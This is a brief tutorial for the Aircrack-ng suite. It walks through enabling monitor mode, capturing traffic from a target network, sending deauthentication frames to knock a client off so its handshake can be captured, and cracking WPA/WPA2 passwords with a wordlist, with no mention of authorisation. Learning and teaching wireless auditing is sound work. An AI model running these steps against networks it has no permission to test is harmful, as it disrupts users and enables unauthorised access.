# Aircrack-ng Guide

Aircrack-ng is a suite of tools for auditing wireless networks. It includes various utilities for capturing, monitoring, and cracking Wi-Fi passwords. This guide will walk you through some common Aircrack-ng commands.

## Installation

Make sure you have Aircrack-ng installed on your system. You can install it using package managers like `apt` on Debian-based systems or `brew` on macOS.

```bash
# Debian/Ubuntu
sudo apt-get install aircrack-ng
```

## Basic Commands

1. Monitor Mode

Before you can capture packets, your wireless card needs to be in monitor mode.

```bash
iwconfig
```

```bash
sudo airmon-ng start <interface>
```

2. Packet Capture

Capture packets from a specific channel.

```bash
sudo airodump-ng -c <channel> --bssid <target_BSSID> -w <output_file> <interface>
```

3. Deauthentication Attack

Force a client to reconnect, capturing the handshake.

```bash
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> <interface>
```

4. Crack WPA/WPA2 Password

Once you have captured the handshake, use Aircrack-ng to crack the password.

```bash
sudo aircrack-ng -a2 -b <target_BSSID> -w <wordlist_file> <capture_file>
```
